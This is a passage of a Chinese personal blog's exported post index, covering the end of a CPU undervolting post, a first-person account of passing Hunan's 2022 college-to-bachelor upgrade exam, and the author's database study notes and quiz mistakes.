30895&#x2F;215&#x2F;308&#x2F;1.194V 75°C&#x2F;208W&#x2F;299W&#x2F;1.198V Mode 6 94&#x2F;298&#x2F;434&#x2F;1.222V 863&#x2F;12664&#x2F;1.272V 30783&#x2F;228W&#x2F;341W&#x2F;1.252V 84°C&#x2F;222W&#x2F;331W&#x2F;1.256V Mode 7 闪退 81°C&#x2F;222W&#x2F;331W&#x2F;1.236V Mode 8 闪退 866&#x2F;12686&#x2F;1.222V 30800&#x2F;212W&#x2F;310W&#x2F;1.192V 77°C&#x2F;207W&#x2F;303W&#x2F;1.198V 可以得出结论是 CPU Lite Load Mode 调整的是 AC DC LoadLine 的值，而 LLC Mode 则调整的是 VRM LoadLine 的值，而 AVX2 Voltage Guardband 好像没什么作用，其三者功能都是对 CPU 做电压补偿，所以楼主所说的仅用 LLC 做电压补偿是可行的。 调整 Voltage Offset在此基础上我对 CPU 电压进行 Offset 调整，目前我 CPU 的参数是：AC DC 1, LLC Mode 6, AVX Voltage Guardband Scale 0, PL1&#x3D;PL2&#x3D;253W。 然后根据楼主的方法跑R23测试临界值，不跑 P95 AVX 的原因是因为负载太大，其实际使用中根本碰不到这种场合，所以意义不大 VRM LLC Offset P95 R23 FPU result 6 -0.05 闪退 85°C&#x2F;226W&#x2F;351W&#x2F;1.252V 6 -0.10 79°C&#x2F;206W&#x2F;323W&#x2F;1.208V 80&#x2F;201W&#x2F;316W&#x2F;1.212V 6 -0.11 78°C&#x2F;203W&#x2F;316W&#x2F;1.198V 79&#x2F;197W&#x2F;306W&#x2F;1.202V 6 -0.12 掉线程76°C&#x2F;220W&#x2F;311W&#x2F;1.190V Auto -0.05 76°C&#x2F;212W&#x2F;314W&#x2F;1.196V Auto -0.06 掉线程75°C&#x2F;210W&#x2F;310W&#x2F;1.186V Auto -0.07 掉线程 Auto -0.10 掉线程 摸 CPU 跑 R23 的最低电压 Freq Offset R23 remark 5.3GHz -0.19V 1.152V 5.4GHz -0.185V 1.192V 5.5GHz -0.14V 1.236V 5.6GHz -0.09V 1.286V&#x2F;188W 5.7GHz +0.01V 1.366V&#x2F;229W 5.8GHz +0.12V 1.494V&#x2F;299W 设置少了不稳，设置多了撞墙 摸单核体质摸 VID 表在摸大核体质的时候因为小核最低也有 1.0xV 的电压，所以需要手动进BIOS把小核关闭。 得到VID表如下 第二步：放弃其实在降压过程中在调整LLC后，对于我这颗CPU的体质已经到上限了，再调整频率的话收益不大，所以就这样用了，在极限烤机下能到温度墙的边缘，自己已经挺满意这样的情况了。 所以CPU下最终结果是，关闭 HT+VRM LLC Mode 8 7 + CPU LiteLoad Mode 1。 对性能0提升，仅仅对极限环境下的稳定性有提升（伪）。 参考资料https://ngabbs.com/read.php?tid=34192551&amp;rand=980 https://skatterbencher.com/2022/11/24/skatterbencher-50-intel-core-i7-13700k-overclocked-to-6000mhz/ https://elmorlabs.com/2019-09-05/vrm-load-line-visualized/","categories":[{"name":"硬件","slug":"硬件","permalink":"https://blog.irec.moe/categories/%E7%A1%AC%E4%BB%B6/"}],"tags":[{"name":"PC","slug":"PC","permalink":"https://blog.irec.moe/tags/PC/"}]},{"title":"3年大专&专升本上岸记录","slug":"学习/经验/湖南理工学院专升本上岸记录","date":"2022-07-30T12:30:00.000Z","updated":"2023-08-19T04:16:49.000Z","comments":true,"path":"/escape_ydxy.html","permalink":"https://blog.irec.moe/escape_ydxy.html","excerpt":"","text":"个人背景我高三厌学，因为家里有表哥的先例，和家人商议后选择了单招。前期院校就随便凭自己的兴趣选的湖南邮电职业技术学院。 在19年那年单招考试成绩出了后，我被原高中准许离校，便赴约去了深圳一趟（4月），见到了好多好多大佬。 一窗台手机的大佬 单招考试的时候报名了校内的青春10000号，之后回校（湖南邮电职业学院）参加，就相当于打暑假工了。工作虽然不辛苦，但是很锻炼情绪，自己的坏习惯暴脾气给上班上没了，具体原因嘛，你猜。 上班到9月我就提桶跑步了，暑假工的钱，给父上大人换了一个K20Pro。 之后就是大学生活的日常了，军训，开学第一课…… 一切都很正常，是我想要的大学样子，自己也对现状很满意（伪）。 其实直到大三我才意识到这完全不是我想象中大学的样子，在大一上课我要么就是在玩斗地主要么就是在睡觉，室友开始逃课，我也开始逃课，不过晚上还是要上班。生活是真的充实，每天睡的很香。 要不被环境影响是很难的，自己也很难意识到，大专总体环境就不说了吧，就是网上说的大专现状那样子。但虽然是大专但也有好的老师，给予我很多启发以及帮助，比如王香英老师，熊雅豪老师、张倩老师…… 突如起来的疫情，让很多人都乱了手脚，我却很开心，到家不愁吃不愁穿，每天还能打游戏。开学的也是一个“假”开学。上课同学基本上不听，然后我也接着不听了，后来呢老师也摆烂。 疫情期间让我印象最深的是王老师不拘泥于网课形式，仍然对同学尽心尽力，连我也“被迫”参与其中，因为考核形式实在是不能摆，23333。 因为王老师的教学形式，我对英语的兴趣始终没有减退，从大二开始就一直记单词到现在，英语三、四级考试也成功顺利通过了，准备在本科冲一冲六级。 大二是我觉醒的时期，因为在大一下的疫情期间，被人作为大专生瞧不起。这也是一个契机，凭啥就凭学历歧视人，我也没隐瞒我是大专生，就因为学历这样说别人，带专人人上人？我看未必。 大三上的后半个学期和暑假实习去了，这着实让我感觉到了生活的艰辛，并以此为契机开始努力学习了。后面就是专升本的事情了。 这种充实的生活引起我的警觉了，因为白天几乎没有闲着，晚上洗澡的时候思考人生。究竟适不适合干这种事（智能家居安装），觉得工作价值意义不太符合自己的观念。但是自己一直在以“提前体验生活、体验社会”为理由，让自己坚持。自己本身目的之一是拿到实习证明，第二是去得到社会经验。 from：https://ancient-pasta-c48.notion.site/2021-f233c5e6f5c3415595ef90778fb67f3a 考试前期准备在校首先是知道了有个自考专升本，也报名了，再后面才知道有统招的专升本，有点后悔，三年的钱也有1w了，但是也算自己成功路上的铺垫吧。 专业选择在湖南省的话，这一块只要关注一个文档。 《湖南省2022年普通高校专升本考试对应专业（类）指导目录》 from：https://jyt.hunan.gov.cn/jyt/sjyt/hnsjyksy/web/ksyzcfg/202204/t20220418_22739135.html 湖南的政策是不允许跨考，也就是只能报考你专业相关的，这点同学们需要注意。 比如我的是移动通信技术专业，所属专科专业大类是通信，然后可以报考本科的电子信息类和计算机类。 有一个培训机构专门做了一个网站，可以在上面查询可以报的专业和学校，就不用自己一个一个翻查了。 link：http://www.cnupp.com/chaxun/ 2022年专升本考试有所延期，在3月9日的时候发了推迟通知。我得以多了半个月学习时间，这至关重要！ 1.填报志愿时间由3月10日-15日延迟到3月22日-27日； 2.免试生录取完成时间由4月15日延迟至4月25日； 3.考试时间由4月20日-30日延迟到5月6日-16日； 4.录取时间由5月15日左右延迟到6月10日左右。 from：https://jyt.hunan.gov.cn/jyt/sjyt/hnsjyksy/web/ksygggs/202203/t20220309_22739656.html 反正需要时时刻刻关注招考动态，在学校官网和湖南省教育厅都会有通知的 择校其实也没有什么好选的，建议根据自己的学习情况，针对性的择校。如果自己觉得能力强的话，可以冲一冲，如果不太好还是保守点好。 对于现在这个大环境下，有一个本科学历还是要比专科好的（先不论个人能力），自己一定要慎重选择，只有一次机会。 我个人只是嫌弃民办学校学费太贵，不想给家里太大压力。大家一定要量力而行！参考上面的图我报的学校以及专业录取率只有13.33%。 from：https://www.bilibili.com/video/BV1VP4y1W7WE 关于考试以及备考在考试的前期学校官网会有考纲出来，关注学校官网以及教务处这两个地方！然后就可以看到你所要考的科目，以及考试范围（这个依学校来定） 由于是已经考完了才写的，所以在后文是以考试角度分析的，也对你们更有参考性一点。对于以此学校为目标备考的同学更有参考性一点。不过我个人建议还是要熟络全书，选拔性考试，还是要做好万全的准备的。 时间线2021年7月-10月7月13日，和家里人商量专升本事宜，表示支持。 7月15日报名缴费楚晟教育培训班，学费6***。 7-10月实习，学习时间极少 这是唯一在相册里找到的图片。 2021年10月-12月参加学校毕业设计培训。 参加自考专升本考试。 开始跟班学习，刚开始备考是准备通信工程专业的，对我来说通信原理和高数是两大天坑，然后查资料才知道是可以选其他专业的，培训班的老师还持怀疑态度，劝退我。 11月，开始备考四级和自考英语考试，脱离宿舍生活。 图书馆周末不开门 一个人在操场上散步 2021年1月-2月 回家过年 没有学习 断断续续的学习回学校开始上线下的课程了，已经意识到了紧迫性，因为在此之前，自己的学习时间仅仅只限于上课的时候，线下完全没有自己去主动学习。 这是Notion，用的b站Hannability的模板。 可以看出来我在2月前是比较难受的一个阶段，我自己可以把这段时间定义为自己的试错阶段吧，自己在不断尝试新方法来提高自己的学习力，再后面的几周就变样了，关于里面的内容我可以截取一周的给你们参考。 这是一个简单的 Tracker。 每天花5分钟写一写东西，保持输出能力。 然后后面几周的可见比以前的好很多了。 心理过程要说我不焦虑是不可能的，其实是后面的焦虑感越来越大，被我化成动力了。 晚上想高数的题目睡不着觉，凌晨5点爬起来刷模拟卷，其实到最后高数的模拟卷只做了5套，完整复盘了3套。 我最大的问题确实是在高数，我前期刚开始复习的时候连三角函数都分不清。后面还是慢慢来，题目一道一道做，看书上的知识点记忆+实践。平时上课的知识点全部弄懂了，然后错题也整理，老师上课讲的每一道题目都弄懂弄通，不会的题目就丢错题本里，一遍一遍刷，第一遍做对的题目就留着，做错的打个标记擦掉，第二天继续做，重复以上，直到做对为止。 程序设计基础，emmm，就只有数据库没学过，C是浅学吧，也不难。这俩我花的时间相对较少。 考试前夕5月3日，定了一个学校附近的宾馆的情侣房，其他宾馆要么就是比较差的，要么没房了，只剩下这个了。。这也是我人生中唯一一次住情趣房。233333，如果再晚点就没地方住了就惨了。其实应该还早点定的，岳阳的宾馆挺便宜，这种房2晚只要226。 然后查了查进学校考试是走东一门，刚开始还感觉怪怪的，怎么是南湖学院，是不是搞错了，事实证明就是这里。（直到今天我还是没搞懂这个学校的院区分部，南湖是在北方，本部却在南方，好奇怪设定） 5月10日，根据发的涉疫统计表，查看了竞争压力，也就是简单筛选一下那些因为疫情不能来的，给自己减轻一些压力。 5月13日 G832 长沙 -&gt; 岳阳。 学校大门口 所谓的情趣大床，23333 买了桶装水，咖啡是自备的，怕考试的时候睡着。 第二天一清早就看到父上大人发的消息，趁着泡咖啡的功夫洗了个澡。 早餐吃的玉米肠+牛奶，要让自己有点饥饿感，才不犯困。 上午考完，自我感觉不错，中午的饭是免费的。 下午考完就去找了饼饼，约了个饭（实际上是各付各的），第二天早上我就回我的大专了。 学校的图书馆 考试阶段大学英语英语是四级难度差不多的水平，我也只考了73分。对于我仍然是完形填空和作文拉了，拿手的阅读理解试卷上只有两篇。 如何更能优化呢？这个不用多说吧。 理工专业基础这一门考试其实是数学，只考了高数上，当时看到考纲的时候只说了考同济高数这本书，我打电话给学校的老师问，也表示不清楚，要等老师。复习的时候我高数上下双修，最后没考是没想到的。 刚开始跟同学讨论，预测高数上是重点。 题目难度并不难，其中很多题目我都做过了。考察的重点是积分部分，比如说三角换元、裂项相消之类的。这种小技巧的并不太难的地方我都针对性的复习了，所以考试在这方面没有太丢分。最后一题是定积分求面积，没做出来（但那道题求体积我会做），题目我贴在下面了，有兴趣可以做一下。 最后考试考了87分，其实我考试的时候求不定积分常数 C 忘记写了，不过老师是人性化改卷，该扣的扣了该给的也给了。 总体难度还是偏易，毕竟这是面向专科生的考试。 程序设计基础最后一门是程序设计基础，这场考试刚拿到试卷我就窃喜了，因为：全！是！编！程！题！ 在学校发布的文件中，我很早就注意到了这句话 以程序设计工程应用能力考核为主 这代表了什么，代表了肯定是编程题占大头。没想到占这么大头，试卷一共5道题，每道题20分。前4道是C语言的，最后一道是数据库的。 题目都不难，数据库我认为比较难的 not exist 都没考，难度就到多表查询那么大。 C 语言的题目的难度呢，我认为在 OJ 里刷3天题目就够了，然后把谭书简单看一遍。 举一道题的例子吧，是这样的。 输入一个正整数，求这个数的偶数和（包括它本身） 例： 输入：5 输出：6 输入：8 输出：20 这是我认为在里面比较难的题目了，因为其他题目都是简单的输入输出循环控制。这道题稍微要动一点点脑子。 总结考试难度中等偏易，给的建议就是要全面复习，不要往难题钻，这也是我们数学老师多次强调的. 在前期复习的时候我看的是 MOOC 上翁恺的课程，数据库看的是哈工大课程，现在网上资源特别丰富，根本不愁找不到课程，最重要的还是自己的决心与毅力。 考试结束后5月19日，我还在整理大专的旧书，准备拖出去卖。别人告诉我的学校官网公布成绩了。 当时自己还觉得自己上不了，然后查下来发现排名是本专业第二，和之前查参加考试人数一样的办法。 第一名是他，第二名就是我了。 晚上就和室友拿卖书的钱买奶茶喝了。 之后呢，就是忙毕设，整理行李回家。 6月28日，顺利拿到专科毕业证。 8月3日，拿到专升本录取通知书。 后记这篇主要是以记录为主，本人文笔有限只能像写日记这样叙述出来。 学历是一块敲门砖，但是不要忘了能力依然很重要。 我虽然作为专科生，但是在自己的空闲时间折腾很多奇奇怪怪的东西，和周围的同学相比格格不入（虽然我也玩游戏）。但是我记着我要对自己的人生负责，自己想要什么样的生活就去争取。我从高中到大学的最大变化是，有了长远目标了。 曾经的我是只要有游戏玩，能让我快乐就满意了，但是经过了很多次现实的历练（实习）逐渐认识到了残酷，赚钱真难，官场气氛难受。然后发现学习是另一条能让自己成长的路，既然还年轻，不如多学一点？ 我个人的建议是，建议你们提前体验一下实习的生活，专科的实习是一个很棒的机会，如果没有实习，我心里就没有强烈的对比感，可能这个本科也就上不去了。 痛苦+反思&#x3D;进步 我一直在用这个来减轻痛苦，事实证明这也有用。 希望本文能帮助到你们，也希望你们能顺利升上自己想要的大学。 加油！","categories":[{"name":"学习","slug":"学习","permalink":"https://blog.irec.moe/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"考试","slug":"考试","permalink":"https://blog.irec.moe/tags/%E8%80%83%E8%AF%95/"},{"name":"升学","slug":"升学","permalink":"https://blog.irec.moe/tags/%E5%8D%87%E5%AD%A6/"}]},{"title":"数据库笔记","slug":"学习/记录/数据库笔记","date":"2022-04-15T16:00:00.000Z","updated":"2025-07-07T17:24:56.967Z","comments":true,"path":"/dbnote.html","permalink":"https://blog.irec.moe/dbnote.html","excerpt":"","text":"数据库笔记第1章 绪论1.1 数据库系统概论1.2 数据模型数据模型是对现实世界数据特征的抽象 数据模型是数据库系统的核心和基础 两类数据模型概念模型（信息模型）：按用户的观点来对数据和信息建模，用于数据库设计 逻辑模型（网状模型、层次模型、关系模型、面向对象数据模型….）：按计算机系统的观点对数据建模、数据库管理系统的实现 物理模型： 描述数据在系统内（磁盘上）的表示方法和存取方法 现实世界 –&gt; 概念模型：数据库设计人员完成 概念模型 –&gt; 逻辑模型：数据库设计人员完成、数据库设计工具协助完成 概念模型实体-联系（Entity-Relationship）：用E-R图来描述现实世界的概念模型 实体：具体的人、事或抽象的概念（例如学生 属性：就是属性 码：唯一标识 实体型：实体名+属性名来抽象刻画同类实体 实体集：同一类型实体的集合 联系：就是联系 实体内部的联系：各属性之间的关系 实体之间的联系：不同实体集之间的联系（1 : 1、1 : M、M : N） 数据模型：是严格定义的一组概念的集合数据结构：组成对象和对象之间的联系 数据操作：对数据库允许执行的操作的集合。就是对操作的规则 数据的完整性约束：要让数据库符合这种规则不让数据库乱七八糟（主键必须存在，如果有引用的外键，要怎么怎么样做之类 关系数据模型是目前最重要的一种数据模型，它的三个要素分别是（ ） A. 实体完整性、参照完整性、用户自定义完整性 B. 数据结构、关系操作、完整性约束 C. 数据增加、数据修改、数据查询 D. 外模式、模式、内模式 这题和哪种数据模型没关系，数据模型通常都由那三种组成的。 常用的数据模型 格式化模型中的数据结构的单位：基本层次联系 层次模型表示方法：实体型、属性、联系 定义：1、只有一个节点没有双亲节点，这个节点叫根节点 ​ 2、根以外的其他节点只有一个双亲节点 特点：1、节点双亲唯一 ​ 2、只能直接处理一对多 ​ 3、不能脱离双亲独立存在 ​ 4、任何记录只能一层一层找下去 优点：1、数据结构清晰 ​ 2、查询效率高，性能优于关系模型 ​ 3、良好的完整性支持 缺点：1、多对多联系不太好 ​ 2、插入和删除限制多 ​ 3、查询子女节点必须经过双亲节点 网状模型表示方法同层次模型 定义：1、允许一个以上的节点无双亲 ​ 2、一个节点可以有多个双亲 ​ 3、两个节点有多种联系 多对多在网状模型中的表示：多对多分解成一对多 完整性约束条件不严格： 1、允许插入未确定双亲结点值的子女节点值 2、允许只删除双亲节点值 实际的网状数据库系统： 1、支持码 2、保证一个联系中双亲记录和子女记录之间是一对多联系 3、可以定义双亲记录和子女记录之间某些约束条件 例：要求双亲记录存在才能插入子女记录，双亲记录删除时也同时删除。 ​ 学生选课记录值中学号必须是学生记录中存在的某一学生学号， ​ 课程号必须是课程记录中存在的某一门课程号。 优点：1、更加直接的描述现实世界，一个节点多个双亲 ​ 2、性能高 缺点：1、结构复杂 ​ 2、DDL、DML 语言太难 关系模型关系（Relation）：一张表 元组（Tuple）：一行即为一个元组 属性（Attribute）：一列即为一个属性 主码（Key）：唯一确定一个元组 域（Domain）：一组具有相同数据类型的值的集合，属性的取值范围来自域** 分量：元组中的一个属性值 关系模式：对关系的描述 ​ 学生（学号，姓名，年级，年龄） 关系必须是规范化的，关系的每一个分量必须是一个不可再分的数据项（这个好理解周老师讲过了，列中有列） 数据操作都是集合操作：操作对象和操作结果都是关系 优点：1、建立在严格的数学概念的基础上 ​ 2、概念单一：实体和各类联系都用关系来表示，对数据的检索结果也是关系 ​ 3、关系模型的存储路径对用户透明 缺点：由于存储路径透明，查询效率不如格式化数据模型。为了提高效率必须对用户的查询请求进行优化（例如缩小查询范围，多表关联的时候先筛一部分） 1.3 数据库系统的结构开发人员角度：三级模式结构。数据库系统内部的系统结构 用户角度：单用户结构、主从式结构、分布式结构、客户-服务器、浏览器-应用服务器 &#x2F; 数据库服务器 模式的概念模式：对数据库逻辑结构和特征的描述（学生表） 实例：模式的具体值（升本成功的所有学生的记录、没有升本成功的所有学生的记录） 模式是固定的、示例是变化的 三级模式 多个 外模式（子模式、用户模式）：数据库用户使用的局部数据的逻辑结构和特征的描述 ​ 与模式的关系：通常是模式的子集、一个模式有多个外模式 ​ 与应用的关系：一个外模式可以为多个应用系统所使用，一个应用程序只能使用一个外模式 ​ 用途：简化用户视图。保证数据库安全性 一个 模式（逻辑模式）：数据库中全体数据的逻辑结构和特征的描述 ​ 定义：1、用 DDL 定义数据的逻辑结构 ​ 2、定义数据之间的联系 ​ 3、定义数据有关的安全性、完整性要求 一个 内模式（存储模式）：物理结构和存储方式的描述 二级映像外模式 -&gt; 模式 定义外模式和模式之间的对应关系 映像定义 通常包含在各外模式的描述中 每一个外模式都有一个 外模式 -&gt; 模式 映像 保证数据的逻辑独立性：当模式改变时，DBA 对 外模式 &#x2F; 模式 映像做相应改变，使外模式保持不变。应用程序是依据数据的外模式编写的，应用程序不用改，保证了数据与程序的逻辑独立性，简称RT 模式 -&gt; 内模式 定义数据全局逻辑结构与存储结构之间的对应关系 这个映像是唯一的，保证数据的物理独立性 优势：保证了应用程序的稳定性 ​ 以程序为中心 -&gt; 以数据为中心 ​ 数据的存取由数据库管理系统管理 1.4 数据库系统的组成1、硬件平台及数据库：大内存、大磁盘、大通道 2、软件：数据库管理系统、操作系统、与数据库接口的高级语言及其编译系统、应用开发工具、数据库应用系统 3、人员：用户、应用程序员、系统分析员和数据库设计人员、数据库管理员 1、数据库管理员：略 2、系统分析员：负责应用系统的需求分析和规范说明 ​ 与用户及数据库管理员结合，确定系统的硬软件配置 ​ 参与数据库系统的概要设计 ​ 数据库设计人员：参加用户需求调查和系统分析确定数据库中的数据 ​ 设计数据库各级模式 3、应用程序员：设计和编写应用系统的程序模块进行调试和安装 4、用户：通过应用系统的用户接口使用数据库 1.5 小结重点：概念模型的基本概念、数据模型的3个组成要素、三模两映、数据库系统的逻辑独立性和物理独立性 第10章 数据库恢复技术事务的四大特性：ACID Atom 原子性 Consistent 一致性 Isolate 隔离性 Duration 持久性 第11章 并发控制并发带来的问题丢失修改 读脏数据 不可重复读 解决办法排他锁：写锁 X锁 共享锁：读锁 S锁 封锁协议一级封锁协议：修改时，必须加X锁，直到结束。 二级封锁协议：读的时候，加S锁，用完就放。 三级封锁协议：读的时候，加S锁，直到结束。","categories":[{"name":"学习","slug":"学习","permalink":"https://blog.irec.moe/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"笔记","slug":"笔记","permalink":"https://blog.irec.moe/tags/%E7%AC%94%E8%AE%B0/"},{"name":"数据库","slug":"数据库","permalink":"https://blog.irec.moe/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"数据库错题","slug":"学习/记录/数据库错题","date":"2022-04-15T16:00:00.000Z","updated":"2025-07-07T17:25:02.094Z","comments":true,"path":"/dbquestion.html","permalink":"https://blog.irec.moe/dbquestion.html","excerpt":"","text":"数据库错题下面列出的数据管理技术发展的三个阶段中，没有专门的软件对数据进行管理的是（ ）。 I．人工管理阶段 II．文件系统阶段 III．数据库阶段 A. I 和 II B. 只有 II C. II 和 III D. 只有 I 关于数据库系统语言，下列说法正确的是______。 A.数据库系统语言包括了DDL和DML B.数据库系统语言包括了DDL、DML和DCL C.数据库系统语言包括了DDL、DML和C++&#x2F;Java D.数据库系统语言包括了DDL、DML和程序设计语言 下列说法不正确的是_______________。 A.模式是对数据的抽象，数据的结构性描述称为模式 B.数据模型是对模式的抽象，模式的结构性描述称为数据模型 C.一个数据库是由一系列模式及其数据构成的 D.模式是对数据模型的抽象，数据模型的结构性描述称为模式 第一代数据库系统是指_______________。 A.文件系统 B.基于XML模型的数据库系统 C.基于关系模型的数据库系统 D.基于网状模型或层次模型的数据库系统 tip:是数据库系统，不是数据管理（记录）阶段 第二代数据库系统是指_______________。 A.基于文件的数据库系统； B.基于XML模型的数据库系统 C.基于网状模型或层次模型的数据库系统 D.基于关系模型的数据库系统 现有如下关系：患者（患者编号，患者姓名，性别，出生日期），医疗（患者编号，患者姓名，医生编号，医生姓名，诊断日期）。其中，“医疗”关系中的外键是_______ A.患者编号 B.患者姓名 C.患者编号和患者姓名 D.医生编号 关于关系模型完整性的说法，不正确的是___ A.外键如果取空值，则违反了参照完整性 B.数据库中有了空值会影响许多方面，如影响聚集函数运算的正确性等 C.用户自定义完整性是指用户针对具体的数据库应用所定义的完整性约束条件 D.实体完整性和参照完整性一般由DBMS系统自动支持 tips：外键可以为空，非空则要有对应的值 关于关系模式与关系，说法不正确的是_______ A.关系模式是稳定的；同一关系模式下，只有一种关系 B.同一关系模式下，可有很多的关系 C.关系模式是关系的结构, 关系是关系模式在某一时刻的数据 D.关系模式是稳定的；而关系是某一时刻的值，是随时间可能变化的 根据上述关系，求表R⋈W的结果_______ A. B. C. D.没有正确答案 系如下图所示，查询既学习课程号为001课程又学习课程号为002号课程的学生的学号,正确的是_______ A. B. C. D. tip：D选项查询结果为空，原因自己想。 关系R与关系S只有一个公共属性，T1是R与S做θ连接的结果，T2是R与S自然连接的结果，则下列说法正确的是_______ A.T1的属性个数大于T2的属性个数 B.T1 的属性个数等于T2 C.T1的属性个数小于T2 D.T1的属性个数大于或等于T2的属性个数 tip：做θ连接时不需要将公共属性合并，而自然连接时需要，所以 T1 的属性个数大于 T2 的属性个数 已知关系S(S#,Sname,Sage,Sclass), SC(S#,C#,Score)。如下所示关系代数表达式的含义是________。 A.其他全不对 B.查询没有学习过课程号为002号课程的学生姓名和年龄 C.查询不仅仅学习课程号为002号课程的学生姓名和年龄 D.查询学习课程号为002号课程的学生姓名和年龄 tips：此公式中 S X SC 运算之后 , 所有人都存在 C#&#x3D; 002 所以答案为空。 表达“从一个关系的所有行中提取出满足某些条件的行”，“从一个关系的所有列中提取出某些列”“提取出属于一个关系但不属于另一关系的所有元组”“将两个关系必须按照某种条件串接成一个较大的关系”的操作依次是__________。*1、并 2、交 3、积 4、选择 5、投影 6、差 7、连接* A.4567 B.4537 C.3567 D.4561 tip：理解概念，认真读题。错选的原因是没有读到 必须按照某种条件串接 并只是简单的并起来就行了。连接有很多中条件可以选。 设关系R与关系S具有相同的目数（或称度数），且相对应属性的值取自同一个域，则R-(R-S）等于_________。 A.R∩S B.R∪S C.S - R D.S tip：为 R 与 S 的交，由同时出现在 R 和 S 中的元组构成，交运算可以通过差运算来实现： R S&#x3D;R –(R S)&#x3D;S –(S R) INSERT INTO Goods(Name，Storage，Price) VALUES (’Keyboard’，3000，90.00)的作用是________。 A.添加数据到一行中的部分列 B.添加数据到一行中的所有列 C.插入默认值 D.插入多个行 tip:添加的可能是所有列，也可能是部分列。这题有歧义，没有给表结构 设关系Teacher的结构为：Teacher（T# char(3), Tname char(10), D# char(2), Salary float(2))，其中T#教师编号，Tname教师姓名，D#系号，Salary工资。Dept（D# char(2),Dname char(10),Dean char(10)),Dname系名，Dean系主任。若要将所有计算机系的教师工资上调10%，则可用_________。 A.Update Teacher Set Salary &#x3D; Salary * 1.1 Where D# in ( Select D# From Dept Where Dname&#x3D;‘计算机’); B.Update Salary &#x3D; Salary * 1.1 Where D# in ( Select D# From Dept Where Dname &#x3D;‘计算机’); C.Update Salary &#x3D; Salary * 1.1 Where D# in (Select D# From Dept Where Dname &#x3D; 计算机); D.Update TABLE Teacher Set Salary &#x3D; Salary * 1.1 Where D# in ( Select D# From Dept Where Dname &#x3D; ‘计算机’); tips：UPDATE 后直接接表名 陈述A：SubQuery1 UNION SubQuery2语句，其中SubQuery1和SubQuery2查询中相应的列必须以同一顺序出现。 陈述B：GROUP BY和HAVING子句不能在子查询中使用，这些子句只能用在最后一个查询结束时来总结和排序最后结果集。 关于陈述A和B，下列说法正确的是_________。 A.陈述A正确，陈述B错误 B.都是正确的 C.都是错误的 D.陈述A错误，陈述B正确 tips：对于并的理解 在SQL中，与”NOT IN”等价的操作符是_________。 A.&lt;&gt; ALL B.&#x3D; SOME C.&lt;&gt; SOME D.&#x3D; ALL tip：？？？不理解 已知如下关系：学生Student(S#, Sname)，课程Course(C#, Cname, T#)，选课SC(S#, C#, Score)，教师T(T#, Tname)。其中S#为学号，Sname为学生命名，C#为课号，Cname为课程名，T#为教师编号，Score为成绩，Tname为教师名。阅读SQL语句 SELECT S# FROM SC WHERE Score&lt;60 GROUP BY C# HAVING Count(*)&gt;2； 关于其查询结果，下列说法正确的是_____。 A.有2人以上不及格课程的同学的学号 &#x2F;&#x2F; 有2人以上不及格的课程，学习该课程的同学的学号 B.有2门以上不及格课程的同学的学号 C.有2门以上及格课程的同学的学号 D.有2人以上及格课程的同学的学号 tips：傻逼题，自己理解 假设一个元组在子查询1中出现m次，在子查询2中出现n次，其中m&gt;0,n&gt;0, 则下列说法正确的是________。 A.该元组在“子查询1 Except 子查询2”中出现0次； B.该元组在“子查询1 Union 子查询2”中出现m + n次； C.该元组在 “子查询1 Except ALL 子查询2”中出现m – n次； D.该元组在“子查询1 Intersect 子查询2”中出现min(m,n)次； 假设一个元组在子查询1中出现m次，在子查询2中出现n次，其中m&gt;0,n&gt;0,则下列说法正确的是_________。 A.该元组在“子查询1 Union ALL 子查询2”中出现m + n次； B.该元组在 “子查询1 Union 子查询2”中出现m+n次； C.该元组在“子查询1 Union ALL 子查询2”中出现1次； D.该元组在 “子查询1 Union 子查询2”中出现Min(m,n)次； 假设一个元组在子查询1中出现m次，在子查询2中出现n次，其中m&gt;0,n&gt;0,则下列说法正确的是_________。 A.该元组在“子查询1 Except 子查询2”中出现0次； B.该元组在“子查询1 Union 子查询2”中出现m + n次； C.该元组在 “子查询1 Except All 子查询2”中出现m – n次； D.该元组在“子查询1 Union All 子查询2”中出现max(m,n)次； 有一个学生表student，包含主键S#（学生编号）等。又有分数表SC，包含S#（学生编号）、score（分数）等。已知student表中共有50个学生，有45人参加了考试（分数存在SC表中），其中10人不及格。执行以下SQL语句：select * from student where exists (select S# from SC where score&lt;60 )， 可返回_________条记录。 A.50 B.45 C.10 D.35 tips：因为这是非相关子查询，而且子查询始终为真(因为已知有10人不及格)，故检索出的是Student表中的所有记录。 难点：并、交 exists嵌套双重否定的理解 关于数据库设计，下列说法正确的是 。 A.若要开发一个信息系统，首先要确定使用哪一个DBMS来进行管理，然后才能进行数据库设计 B.概念数据库设计需要关注用E-R Diagram的思想来理解需求，而不能仅仅关注绘制E-R Diagram的图形 C.逻辑数据库设计的关注点是属性、结构和命名的冲突问题，数据库设计的规范性问题和DBMS的选型问题 D.物理数据库设计仅需要考虑数据量的大小、磁盘空间占用及存储结构等特性，但无关具体的DBMS tips：逻辑数据库不需要关注DBMS选型 若要将E-R图转换成关系模式，转换正确的是_________。 A.学生(学号，课程号，…)；课程(课程号，…) B.选修(学号，课程号，…) C.学生(学号，…)；课程 (课程号，学号，…..) D.学生(学号，…)；课程(课程号，…)；选修(学号，课程号，…) tips：多对多应新建一个关系作为练习 关于E-R 图向关系模式的转换的规则正确的是_________。 A.复合属性转换时只能将每个分量属性作为所在实体对应关系的属性 B.一对一联系的转换只能将联系定义为一个新的关系，再将属性设为参与双方的关键字属性 C.泛化实体与具体化实体在转换时，可以不要泛化实体，而仅将具体化实体转换成关系 D.一对多联系的转换，需将多方参与实体的关键字作为单方参与实体对应关系的属性 tips：D选项说反了，语文理解问题，自己体会。我也看不懂。反正是要把只有一个的那边的属性，加到有很多个个体的属性里面去。 一对多联系的转换，需将单方参与实体的关键字作为多方参与实体对应关系的属性。 如：商店（商店名，xxx）、商品（商品号，xxx，商店名）。1：N关系 下列由E-R图向关系模式转换具体实例中，明显不正确的是________。注意：关系模式中带下划线的属性为主键。 A. B. C. D. tips：注意D选项的已知 在关系模式R(U，F)中，如果F是最小函数依赖集，则____________。 A.R∈2NF B.R∈3NF C.R∈BCNF D.R的规范化程度与F是否最小函数依赖集无关。 tips：D 一般情况，企业会将从一个供应商处一次所进的多种货物办理一次入库，因此设计了关系模式：入库单(单号, 日期, 库房, 供应商，物品, 数量, 金额)，下列说法正确的是___ ______。 A.不满足第2范式 B.满足第2范式但不满足第3范式 C.满足第3范式 D.其他都不对 